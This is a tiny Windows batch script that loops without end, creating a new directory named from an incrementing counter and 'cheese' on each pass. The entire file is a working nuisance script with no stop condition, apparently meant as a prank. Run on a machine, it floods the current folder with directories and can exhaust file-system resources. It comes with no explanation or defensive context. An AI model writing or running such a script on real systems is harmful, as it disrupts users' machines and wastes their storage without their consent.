@echo off
set  counter=0
:top
md %counter%+"cheese"
set /a counter+=1
goto top
